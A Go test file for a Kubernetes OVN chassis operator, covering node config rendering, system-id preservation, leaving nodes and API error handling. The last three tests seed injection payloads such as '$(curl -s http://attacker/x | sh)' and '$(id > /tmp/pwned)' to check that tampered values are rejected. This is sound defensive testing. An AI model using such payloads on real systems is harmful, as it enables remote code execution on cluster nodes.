// SPDX-FileCopyrightText: Copyright 2026 SAP SE or an SAP affiliate company
//
// SPDX-License-Identifier: Apache-2.0

package controller

import (
	"context"
	"testing"

	. "github.com/onsi/gomega"
	corev1 "k8s.io/api/core/v1"
	apierrors "k8s.io/apimachinery/pkg/api/errors"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/runtime"
	"k8s.io/client-go/tools/record"
	"sigs.k8s.io/controller-runtime/pkg/client"
	"sigs.k8s.io/controller-runtime/pkg/client/interceptor"

	ovnv1alpha1 "github.com/c5c3/cobaltcore/operators/ovn/api/v1alpha1"
)

// The two node names every test below selects from, and the identity a node
// carries once it has been rendered. The identity is fixed where a test asserts
// that it survives, because a system-id the operator regenerated is exactly the
// failure those tests exist to catch.
const (
	testNodeA         = "node-a"
	testNodeB         = "node-b"
	testFixedSystemID = "11111111-2222-3333-4444-555555555555"
)

// uuidPattern matches the form k8s.io/apimachinery's uuid generator produces. A
// system-id is opaque to the operator, so the tests assert its shape rather than
// its value.
const uuidPattern = `^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$`

// hashPattern matches a rendered config hash: eight lowercase hex characters.
const hashPattern = `^[0-9a-f]{8}$`

// chassisNode builds a node carrying the given labels.
func chassisNode(name string, nodeLabels map[string]string) *corev1.Node {
	return &corev1.Node{ObjectMeta: metav1.ObjectMeta{Name: name, Labels: nodeLabels}}
}

// selectedLabels are the labels the shared chassis fixture's nodeSelector
// matches.
func selectedLabels() map[string]string {
	return map[string]string{testChassisNodeLabel: "true"}
}

// gatewayLabels are the labels of a node that is both selected and a gateway.
func gatewayLabels() map[string]string {
	return map[string]string{testChassisNodeLabel: "true", testGatewayNodeLabel: "true"}
}

// seededNodesConfigMap builds the nodes ConfigMap as an earlier pass left it, so
// a test can pin the identity a later pass has to keep.
func seededNodesConfigMap(entries map[string]nodeEntry) *corev1.ConfigMap {
	data := make(map[string]string, len(entries))
	for name, entry := range entries {
		data[name] = entry.render()
	}
	return &corev1.ConfigMap{
		ObjectMeta: metav1.ObjectMeta{Name: testOVNChassisName + "-nodes", Namespace: testNamespace},
		Data:       data,
	}
}

// readNodesConfigMap reads the applied nodes ConfigMap back.
func readNodesConfigMap(ctx context.Context, t *testing.T, r *OVNChassisReconciler) *corev1.ConfigMap {
	t.Helper()

	var cm corev1.ConfigMap
	if err := r.Get(ctx, chassisKey(testOVNChassisName+"-nodes"), &cm); err != nil {
		t.Fatalf("reading the nodes ConfigMap back: %v", err)
	}
	return &cm
}

// The rendered entry is the whole channel between the operator and a node, so
// its bytes are part of the contract with apply-node.sh: the script sources the
// file, and a key it does not expect is a value it never applies.
func TestNodeEntryRenderAndHash(t *testing.T) {
	g := NewGomegaWithT(t)

	entry := nodeEntry{
		systemID:       testFixedSystemID,
		gateway:        true,
		bridgeMappings: "physnet1:br-ex",
		encapType:      "geneve",
	}

	g.Expect(entry.render()).To(Equal(
		"SYSTEM_ID=" + testFixedSystemID + "\n" +
			"GATEWAY=true\n" +
			"BRIDGE_MAPPINGS=physnet1:br-ex\n" +
			"ENCAP_TYPE=geneve\n"))
	g.Expect(entry.hash()).To(MatchRegexp(hashPattern))

	// An entry with nothing set still renders every key but LEAVING, so the
	// script sources a complete file whatever the operator knows about the node.
	g.Expect(nodeEntry{}.render()).To(Equal(
		"SYSTEM_ID=\nGATEWAY=false\nBRIDGE_MAPPINGS=\nENCAP_TYPE=\n"))

	leaving := entry
	leaving.leaving = true
	g.Expect(leaving.render()).To(HaveSuffix("ENCAP_TYPE=geneve\nLEAVING=true\n"))
	g.Expect(leaving.hash()).NotTo(Equal(entry.hash()),
		"a node on its way out must not look to the maintenance step like one that is staying")
}

// A live ConfigMap value has to parse back into the entry it was rendered from:
// it is where a node's system-id survives a status the API server lost.
func TestParseNodeEntry_RoundTripsAndIgnoresUnknownKeys(t *testing.T) {
	g := NewGomegaWithT(t)

	entry := nodeEntry{
		systemID:       testFixedSystemID,
		gateway:        true,
		bridgeMappings: "physnet1:br-ex,physnet2:br-data",
		encapType:      "vxlan",
		leaving:        true,
	}

	g.Expect(parseNodeEntry(entry.render())).To(Equal(entry))

	// A key a later operator version added, and a line that carries no separator
	// at all, both leave the known values alone.
	extended := entry.render() + "FUTURE_KEY=whatever\n# a comment\n"
	g.Expect(parseNodeEntry(extended)).To(Equal(entry))

	g.Expect(parseNodeEntry("")).To(Equal(nodeEntry{}),
		"an empty ConfigMap value carries no identity, and inventing one would be worse than none")
}

// Nothing matching is a configuration a chassis can sit in for a while (the
// nodes are labelled after the CR is applied), so it reports rather than fails.
// Both ConfigMaps are still applied: a pod cannot start on a volume whose
// ConfigMap does not exist.
func TestReconcileNodes_NoMatchingNodes(t *testing.T) {
	g := NewGomegaWithT(t)
	ctx := context.Background()
	cr := testOVNChassis()
	r := newTestOVNChassisReconciler(t, cr, chassisNode(testNodeA, map[string]string{"role": "control-plane"}))

	entries, res, err := r.reconcileNodes(ctx, r.Client, cr)

	g.Expect(err).NotTo(HaveOccurred())
	g.Expect(res.IsZero()).To(BeTrue())
	g.Expect(entries).To(BeEmpty())
	g.Expect(cr.Status.Nodes).To(BeEmpty())

	g.Expect(readNodesConfigMap(ctx, t, r).Data).To(BeEmpty())
	g.Expect(r.Get(ctx, chassisKey(testOVNChassisName+"-chassis-scripts"), &corev1.ConfigMap{})).To(Succeed())

	cond := ovnChassisCondition(cr, conditionTypeNodesReady)
	g.Expect(cond).NotTo(BeNil())
	g.Expect(cond.Status).To(Equal(metav1.ConditionFalse))
	g.Expect(cond.Reason).To(Equal(conditionReasonNoMatchingNodes))
	g.Expect(cond.Message).To(ContainSubstring(testChassisNodeLabel+"=true"),
		"the message has to name the selector that matched nothing")
}

// One key per selected node, and nothing for the nodes the selector skips.
func TestReconcileNodes_RendersOneKeyPerSelectedNode(t *testing.T) {
	g := NewGomegaWithT(t)
	ctx := context.Background()
	cr := testOVNChassis()
	r := newTestOVNChassisReconciler(t, cr,
		chassisNode(testNodeA, selectedLabels()),
		chassisNode(testNodeB, map[string]string{"role": "control-plane"}))

	entries, res, err := r.reconcileNodes(ctx, r.Client, cr)

	g.Expect(err).NotTo(HaveOccurred())
	g.Expect(res.IsZero()).To(BeTrue())
	g.Expect(entries).To(HaveLen(1))

	data := readNodesConfigMap(ctx, t, r).Data
	g.Expect(data).To(HaveLen(1))
	g.Expect(data).To(HaveKey(testNodeA))

	entry := parseNodeEntry(data[testNodeA])
	g.Expect(entry.systemID).To(MatchRegexp(uuidPattern))
	g.Expect(entry.gateway).To(BeFalse())
	g.Expect(entry.encapType).To(Equal("geneve"))
	g.Expect(entry.bridgeMappings).To(BeEmpty())
	g.Expect(entry.leaving).To(BeFalse())

	g.Expect(cr.Status.Nodes).To(HaveLen(1))
	g.Expect(cr.Status.Nodes[0].Name).To(Equal(testNodeA))
	g.Expect(cr.Status.Nodes[0].SystemID).To(Equal(entry.systemID))
	g.Expect(cr.Status.Nodes[0].ConfigHash).To(MatchRegexp(hashPattern))
	g.Expect(cr.Status.Nodes[0].Leaving).To(BeFalse())

	cond := ovnChassisCondition(cr, conditionTypeNodesReady)
	g.Expect(cond.Status).To(Equal(metav1.ConditionTrue))
	g.Expect(cond.Reason).To(Equal(conditionReasonNodesRendered))
	g.Expect(cond.Message).To(Equal("Rendered 1 node entries (0 leaving)"))
}

// The identity in the live ConfigMap wins over a fresh one. A regenerated
// system-id leaves the previous registration behind in the Southbound database,
// where it keeps claiming the ports of the workloads on this very node.
func TestReconcileNodes_KeepsSystemIDFromTheLiveConfigMap(t *testing.T) {
	g := NewGomegaWithT(t)
	ctx := context.Background()
	cr := testOVNChassis()
	seeded := seededNodesConfigMap(map[string]nodeEntry{
		testNodeA: {systemID: testFixedSystemID, encapType: "geneve"},
	})
	r := newTestOVNChassisReconciler(t, cr, seeded, chassisNode(testNodeA, selectedLabels()))

	for pass := 1; pass <= 2; pass++ {
		_, _, err := r.reconcileNodes(ctx, r.Client, cr)
		g.Expect(err).NotTo(HaveOccurred(), "pass %d", pass)

		entry := parseNodeEntry(readNodesConfigMap(ctx, t, r).Data[testNodeA])
		g.Expect(entry.systemID).To(Equal(testFixedSystemID), "pass %d", pass)
		g.Expect(cr.Status.Nodes[0].SystemID).To(Equal(testFixedSystemID), "pass %d", pass)
	}
}

// With no ConfigMap left, status is the last record of a node's identity, and it
// is preferred over a fresh one for the same reason.
func TestReconcileNodes_FallsBackToStatusSystemID(t *testing.T) {
	g := NewGomegaWithT(t)
	ctx := context.Background()
	cr := testOVNChassis()
	cr.Status.Nodes = []ovnv1alpha1.OVNChassisNodeStatus{{Name: testNodeA, SystemID: testFixedSystemID}}
	r := newTestOVNChassisReconciler(t, cr, chassisNode(testNodeA, selectedLabels()))

	_, _, err := r.reconcileNodes(ctx, r.Client, cr)

	g.Expect(err).NotTo(HaveOccurred())
	g.Expect(parseNodeEntry(readNodesConfigMap(ctx, t, r).Data[testNodeA]).systemID).
		To(Equal(testFixedSystemID))
}

// spec.gateway narrows the selected nodes down to the ones that announce
// enable-chassis-as-gw. It can only narrow: a node the gateway selector matches
// but the node selector does not belongs to no chassis at all.
func TestReconcileNodes_GatewayFromGatewaySelector(t *testing.T) {
	g := NewGomegaWithT(t)
	ctx := context.Background()
	cr := testOVNChassis()
	cr.Spec.Gateway = &ovnv1alpha1.OVNGatewaySpec{
		NodeSelector: map[string]string{testGatewayNodeLabel: "true"},
	}
	r := newTestOVNChassisReconciler(t, cr,
		chassisNode(testNodeA, selectedLabels()),
		chassisNode(testNodeB, gatewayLabels()),
		chassisNode("node-c", map[string]string{testGatewayNodeLabel: "true"}))

	_, _, err := r.reconcileNodes(ctx, r.Client, cr)

	g.Expect(err).NotTo(HaveOccurred())
	data := readNodesConfigMap(ctx, t, r).Data
	g.Expect(data).To(HaveLen(2), "the gateway selector may only narrow the selected set")
	g.Expect(parseNodeEntry(data[testNodeA]).gateway).To(BeFalse())
	g.Expect(parseNodeEntry(data[testNodeB]).gateway).To(BeTrue())

	g.Expect(cr.Status.Nodes[0].Gateway).To(BeFalse())
	g.Expect(cr.Status.Nodes[1].Gateway).To(BeTrue())
}

// The mappings keep spec order, because that is the order an operator reading
// ovn-bridge-mappings back off a node expects to find them in.
func TestReconcileNodes_BridgeMappingsInSpecOrder(t *testing.T) {
	g := NewGomegaWithT(t)
	ctx := context.Background()
	cr := testOVNChassis()
	cr.Spec.BridgeMappings = []ovnv1alpha1.OVNBridgeMapping{
		{PhysicalNetwork: "physnet1", Bridge: "br-ex"},
		{PhysicalNetwork: "physnet2", Bridge: "br-data"},
	}
	r := newTestOVNChassisReconciler(t, cr, chassisNode(testNodeA, selectedLabels()))

	_, _, err := r.reconcileNodes(ctx, r.Client, cr)

	g.Expect(err).NotTo(HaveOccurred())
	g.Expect(parseNodeEntry(readNodesConfigMap(ctx, t, r).Data[testNodeA]).bridgeMappings).
		To(Equal("physnet1:br-ex,physnet2:br-data"))
}

// A node that loses the selector label keeps its entry, marked leaving. Its
// chassis registration outlives the selection, and the system-id the deletion
// Job addresses has to outlive it too.
func TestReconcileNodes_UnselectedNodeStaysAsLeaving(t *testing.T) {
	g := NewGomegaWithT(t)
	ctx := context.Background()
	cr := testOVNChassis()
	r := newTestOVNChassisReconciler(t, cr,
		chassisNode(testNodeA, selectedLabels()),
		chassisNode(testNodeB, selectedLabels()))

	_, _, err := r.reconcileNodes(ctx, r.Client, cr)
	g.Expect(err).NotTo(HaveOccurred())
	registered := parseNodeEntry(readNodesConfigMap(ctx, t, r).Data[testNodeB]).systemID
	g.Expect(registered).To(MatchRegexp(uuidPattern))

	var node corev1.Node
	g.Expect(r.Get(ctx, client.ObjectKey{Name: testNodeB}, &node)).To(Succeed())
	node.Labels = map[string]string{}
	g.Expect(r.Update(ctx, &node)).To(Succeed())

	_, _, err = r.reconcileNodes(ctx, r.Client, cr)
	g.Expect(err).NotTo(HaveOccurred())

	data := readNodesConfigMap(ctx, t, r).Data
	g.Expect(data).To(HaveLen(2), "the entry survives the deselection until the deletion Job has run")
	g.Expect(data[testNodeB]).To(ContainSubstring("LEAVING=true"))
	g.Expect(parseNodeEntry(data[testNodeB]).systemID).To(Equal(registered),
		"the identity the deletion Job addresses must not change on the way out")

	g.Expect(cr.Status.Nodes).To(HaveLen(2))
	g.Expect(cr.Status.Nodes[1].Name).To(Equal(testNodeB))
	g.Expect(cr.Status.Nodes[1].Leaving).To(BeTrue())
	g.Expect(ovnChassisCondition(cr, conditionTypeNodesReady).Message).To(ContainSubstring("(1 leaving)"))
}

// A node that left the cluster is no different: the ConfigMap key is what keeps
// the record of what has still to be deregistered.
func TestReconcileNodes_GoneNodeStaysAsLeaving(t *testing.T) {
	g := NewGomegaWithT(t)
	ctx := context.Background()
	cr := testOVNChassis()
	r := newTestOVNChassisReconciler(t, cr,
		chassisNode(testNodeA, selectedLabels()),
		chassisNode(testNodeB, selectedLabels()))

	_, _, err := r.reconcileNodes(ctx, r.Client, cr)
	g.Expect(err).NotTo(HaveOccurred())

	g.Expect(r.Delete(ctx, chassisNode(testNodeB, nil))).To(Succeed())

	_, _, err = r.reconcileNodes(ctx, r.Client, cr)
	g.Expect(err).NotTo(HaveOccurred())

	g.Expect(readNodesConfigMap(ctx, t, r).Data[testNodeB]).To(ContainSubstring("LEAVING=true"))
	g.Expect(cr.Status.Nodes[1].Leaving).To(BeTrue())
}

// A node recorded in status but missing from the ConfigMap has never been
// rendered as leaving, so it is picked up from status alone. Its identity comes
// from status too, which is all the deletion Job needs.
func TestReconcileNodes_StatusOnlyNodeStaysAsLeaving(t *testing.T) {
	g := NewGomegaWithT(t)
	ctx := context.Background()
	cr := testOVNChassis()
	cr.Status.Nodes = []ovnv1alpha1.OVNChassisNodeStatus{
		{Name: testNodeB, SystemID: testFixedSystemID, Gateway: true},
	}
	r := newTestOVNChassisReconciler(t, cr, chassisNode(testNodeA, selectedLabels()))

	_, _, err := r.reconcileNodes(ctx, r.Client, cr)

	g.Expect(err).NotTo(HaveOccurred())
	entry := parseNodeEntry(readNodesConfigMap(ctx, t, r).Data[testNodeB])
	g.Expect(entry.leaving).To(BeTrue())
	g.Expect(entry.systemID).To(Equal(testFixedSystemID))
	g.Expect(entry.gateway).To(BeTrue())
}

// Once the deletion Job has succeeded, the maintenance step drops the ConfigMap
// key and the status entry together. A leaving node that is already out of the
// ConfigMap is therefore deregistered, and re-adding it would spawn a Job for a
// chassis that no longer exists.
func TestReconcileNodes_LeavingNodeAbsentFromConfigMapIsDropped(t *testing.T) {
	g := NewGomegaWithT(t)
	ctx := context.Background()
	cr := testOVNChassis()
	cr.Status.Nodes = []ovnv1alpha1.OVNChassisNodeStatus{
		{Name: testNodeA, SystemID: testFixedSystemID},
		{Name: testNodeB, SystemID: "gone", Leaving: true},
	}
	seeded := seededNodesConfigMap(map[string]nodeEntry{
		testNodeA: {systemID: testFixedSystemID, encapType: "geneve"},
	})
	r := newTestOVNChassisReconciler(t, cr, seeded, chassisNode(testNodeA, selectedLabels()))

	entries, _, err := r.reconcileNodes(ctx, r.Client, cr)

	g.Expect(err).NotTo(HaveOccurred())
	g.Expect(entries).To(HaveLen(1))
	g.Expect(readNodesConfigMap(ctx, t, r).Data).NotTo(HaveKey(testNodeB))
	g.Expect(cr.Status.Nodes).To(HaveLen(1))
	g.Expect(cr.Status.Nodes[0].Name).To(Equal(testNodeA))
}

// A target cluster that grants the operator no nodes verb fails here. The
// condition has to flip on that pass: the aggregate Ready is re-derived from the
// sub-conditions at the new observedGeneration, so a condition left untouched
// would report the failed pass as ready.
func TestReconcileNodes_ListErrorIsNodeListError(t *testing.T) {
	g := NewGomegaWithT(t)
	ctx := context.Background()
	cr := testOVNChassis()

	c := ovnChassisFakeClientBuilder(t, cr).
		WithInterceptorFuncs(interceptor.Funcs{
			List: func(ctx context.Context, cl client.WithWatch, list client.ObjectList, opts ...client.ListOption) error {
				if _, ok := list.(*corev1.NodeList); ok {
					return apierrors.NewForbidden(corev1.Resource("nodes"), "", nil)
				}
				return cl.List(ctx, list, opts...)
			},
		}).Build()
	r := &OVNChassisReconciler{Client: c, Scheme: newTestScheme(t), Recorder: record.NewFakeRecorder(10)}

	entries, res, err := r.reconcileNodes(ctx, r.Client, cr)

	g.Expect(err).To(MatchError(ContainSubstring("listing nodes")))
	g.Expect(apierrors.IsForbidden(err)).To(BeTrue(), "the API error must stay unwrappable")
	g.Expect(res.IsZero()).To(BeTrue())
	g.Expect(entries).To(BeNil())

	cond := ovnChassisCondition(cr, conditionTypeNodesReady)
	g.Expect(cond.Status).To(Equal(metav1.ConditionFalse))
	g.Expect(cond.Reason).To(Equal(conditionReasonNodeListError))
}

// A ConfigMap that cannot be read is not a first pass: rendering on top of it
// would hand every node a fresh system-id and orphan its registration, so the
// pass fails instead.
func TestReconcileNodes_ConfigMapReadErrorIsNodesError(t *testing.T) {
	g := NewGomegaWithT(t)
	ctx := context.Background()
	cr := testOVNChassis()

	c := ovnChassisFakeClientBuilder(t, cr).
		WithInterceptorFuncs(interceptor.Funcs{
			Get: func(ctx context.Context, cl client.WithWatch, key client.ObjectKey, obj client.Object, opts ...client.GetOption) error {
				if _, ok := obj.(*corev1.ConfigMap); ok {
					return apierrors.NewForbidden(corev1.Resource("configmaps"), key.Name, nil)
				}
				return cl.Get(ctx, key, obj, opts...)
			},
		}).Build()
	r := &OVNChassisReconciler{Client: c, Scheme: newTestScheme(t), Recorder: record.NewFakeRecorder(10)}

	_, _, err := r.reconcileNodes(ctx, r.Client, cr)

	g.Expect(err).To(MatchError(ContainSubstring("reading the chassis-nodes ConfigMap")))
	g.Expect(ovnChassisCondition(cr, conditionTypeNodesReady).Reason).To(Equal(conditionReasonNodesError))
}

// A target cluster that grants the operator no configmaps verb fails the same
// way, under the reason that covers everything the step projects.
func TestReconcileNodes_ConfigMapApplyErrorIsNodesError(t *testing.T) {
	g := NewGomegaWithT(t)
	ctx := context.Background()
	cr := testOVNChassis()

	c := ovnChassisFakeClientBuilder(t, cr, chassisNode(testNodeA, selectedLabels())).
		WithInterceptorFuncs(interceptor.Funcs{
			Apply: func(ctx context.Context, cl client.WithWatch, obj runtime.ApplyConfiguration, opts ...client.ApplyOption) error {
				if kinded, ok := obj.(kindedApplyConfiguration); ok && kinded.GetKind() == "ConfigMap" {
					return apierrors.NewForbidden(corev1.Resource("configmaps"), testOVNChassisName+"-nodes", nil)
				}
				return cl.Apply(ctx, obj, opts...)
			},
		}).Build()
	r := &OVNChassisReconciler{Client: c, Scheme: newTestScheme(t), Recorder: record.NewFakeRecorder(10)}

	entries, res, err := r.reconcileNodes(ctx, r.Client, cr)

	g.Expect(err).To(MatchError(ContainSubstring("ensuring chassis-nodes ConfigMap")))
	g.Expect(apierrors.IsForbidden(err)).To(BeTrue())
	g.Expect(res.IsZero()).To(BeTrue())
	g.Expect(entries).To(BeNil())
	g.Expect(ovnChassisCondition(cr, conditionTypeNodesReady).Reason).To(Equal(conditionReasonNodesError))
}

// The scripts ConfigMap carries every script the chassis containers and the
// maintenance Jobs run. A missing key is a container that cannot start or a Job
// that cannot deregister a chassis.
func TestReconcileNodes_ScriptsConfigMapCarriesFiveKeys(t *testing.T) {
	g := NewGomegaWithT(t)
	ctx := context.Background()
	cr := testOVNChassis()
	r := newTestOVNChassisReconciler(t, cr, chassisNode(testNodeA, selectedLabels()))

	_, _, err := r.reconcileNodes(ctx, r.Client, cr)
	g.Expect(err).NotTo(HaveOccurred())

	var cm corev1.ConfigMap
	g.Expect(r.Get(ctx, chassisKey(testOVNChassisName+"-chassis-scripts"), &cm)).To(Succeed())
	g.Expect(cm.Data).To(HaveLen(5))
	for _, key := range []string{
		hostPrepareScriptKey, applyNodeScriptKey, runVswitchdScriptKey,
		evacuateScriptKey, chassisDelScriptKey,
	} {
		g.Expect(cm.Data).To(HaveKey(key))
		g.Expect(cm.Data[key]).To(HavePrefix("#!/bin/bash\n"), key)
	}
}

// configHash records what a node has applied, not what was rendered for it. A
// spec change therefore leaves the recorded hash where it is, which is the drift
// the maintenance step acts on.
func TestReconcileNodes_ConfigHashCarriedFromStatus(t *testing.T) {
	g := NewGomegaWithT(t)
	ctx := context.Background()
	cr := testOVNChassis()
	r := newTestOVNChassisReconciler(t, cr, chassisNode(testNodeA, selectedLabels()))

	_, _, err := r.reconcileNodes(ctx, r.Client, cr)
	g.Expect(err).NotTo(HaveOccurred())
	applied := cr.Status.Nodes[0].ConfigHash
	g.Expect(applied).To(MatchRegexp(hashPattern))

	cr.Spec.EncapType = "vxlan"
	entries, _, err := r.reconcileNodes(ctx, r.Client, cr)
	g.Expect(err).NotTo(HaveOccurred())

	g.Expect(parseNodeEntry(readNodesConfigMap(ctx, t, r).Data[testNodeA]).encapType).To(Equal("vxlan"))
	g.Expect(entries[testNodeA].hash()).NotTo(Equal(applied))
	g.Expect(cr.Status.Nodes[0].ConfigHash).To(Equal(applied),
		"the recorded hash is what the node applied, so the drift stays visible")
}

// The nodes ConfigMap is sourced as shell by apply-node.sh in a privileged init
// container, so a value that is not the UUID the operator generated must never
// be rendered back out. Without the shape check a principal with update access
// on the ConfigMap gets command execution on every selected node, and the
// operator re-persists the injected value on every pass and copies it into
// status, so the tamper survives every reconcile and every pod restart.
func TestReconcileNodes_RejectsTamperedSystemID(t *testing.T) {
	g := NewGomegaWithT(t)
	ctx := context.Background()
	cr := testOVNChassis()
	tampered := "$(curl -s http://attacker/x | sh)"
	seeded := seededNodesConfigMap(map[string]nodeEntry{
		testNodeA: {systemID: tampered, encapType: "geneve"},
	})
	r := newTestOVNChassisReconciler(t, cr, seeded, chassisNode(testNodeA, selectedLabels()))

	_, _, err := r.reconcileNodes(ctx, r.Client, cr)

	g.Expect(err).NotTo(HaveOccurred())
	entry := parseNodeEntry(readNodesConfigMap(ctx, t, r).Data[testNodeA])
	g.Expect(entry.systemID).NotTo(Equal(tampered))
	g.Expect(entry.systemID).To(MatchRegexp(uuidPattern))
	g.Expect(cr.Status.Nodes[0].SystemID).To(Equal(entry.systemID),
		"status must not carry the injected value forward either")
}

// status.nodes is the second record a system-id is read back from, and it is
// writable by anything holding the CR's status subresource, so it gets the same
// shape check.
func TestReconcileNodes_RejectsTamperedSystemIDInStatus(t *testing.T) {
	g := NewGomegaWithT(t)
	ctx := context.Background()
	cr := testOVNChassis()
	cr.Status.Nodes = []ovnv1alpha1.OVNChassisNodeStatus{
		{Name: testNodeA, SystemID: "$(id > /tmp/pwned)"},
	}
	r := newTestOVNChassisReconciler(t, cr, chassisNode(testNodeA, selectedLabels()))

	_, _, err := r.reconcileNodes(ctx, r.Client, cr)

	g.Expect(err).NotTo(HaveOccurred())
	g.Expect(parseNodeEntry(readNodesConfigMap(ctx, t, r).Data[testNodeA]).systemID).
		To(MatchRegexp(uuidPattern))
}

// A node on its way out is rendered from the spec rather than from whatever the
// live ConfigMap carries, so a tampered BRIDGE_MAPPINGS cannot be re-persisted
// through the leaving arm either.
func TestReconcileNodes_LeavingEntryRendersMappingsFromSpec(t *testing.T) {
	g := NewGomegaWithT(t)
	ctx := context.Background()
	cr := testOVNChassis()
	cr.Spec.BridgeMappings = []ovnv1alpha1.OVNBridgeMapping{
		{PhysicalNetwork: "physnet1", Bridge: "br-ex"},
	}
	seeded := seededNodesConfigMap(map[string]nodeEntry{
		testNodeB: {
			systemID:       testFixedSystemID,
			bridgeMappings: "$(curl -s http://attacker/x | sh)",
			encapType:      "$(id)",
		},
	})
	r := newTestOVNChassisReconciler(t, cr, seeded, chassisNode(testNodeA, selectedLabels()))

	_, _, err := r.reconcileNodes(ctx, r.Client, cr)

	g.Expect(err).NotTo(HaveOccurred())
	leaving := parseNodeEntry(readNodesConfigMap(ctx, t, r).Data[testNodeB])
	g.Expect(leaving.leaving).To(BeTrue())
	g.Expect(leaving.systemID).To(Equal(testFixedSystemID),
		"the identity the deletion Job addresses still has to survive")
	g.Expect(leaving.bridgeMappings).To(Equal("physnet1:br-ex"))
	g.Expect(leaving.encapType).To(Equal("geneve"))
}

// The selector goes to the API server rather than being applied client-side.
// LiveReader hands out the target cluster's uncached reader, so an unfiltered
// LIST serializes every Node object in the cluster on every pass of every
// OVNChassis, and a DaemonSet rollout produces one such pass per node.
func TestReconcileNodes_ListsNodesWithTheSelector(t *testing.T) {
	g := NewGomegaWithT(t)
	ctx := context.Background()
	cr := testOVNChassis()

	var seen []client.ListOption
	c := ovnChassisFakeClientBuilder(t, cr, chassisNode(testNodeA, selectedLabels())).
		WithInterceptorFuncs(interceptor.Funcs{
			List: func(ctx context.Context, cl client.WithWatch, list client.ObjectList, opts ...client.ListOption) error {
				if _, ok := list.(*corev1.NodeList); ok {
					seen = opts
				}
				return cl.List(ctx, list, opts...)
			},
		}).Build()
	r := &OVNChassisReconciler{Client: c, Scheme: newTestScheme(t), Recorder: record.NewFakeRecorder(10)}

	_, _, err := r.reconcileNodes(ctx, r.Client, cr)

	g.Expect(err).NotTo(HaveOccurred())
	g.Expect(seen).To(ConsistOf(client.MatchingLabels(cr.Spec.NodeSelector)))
}
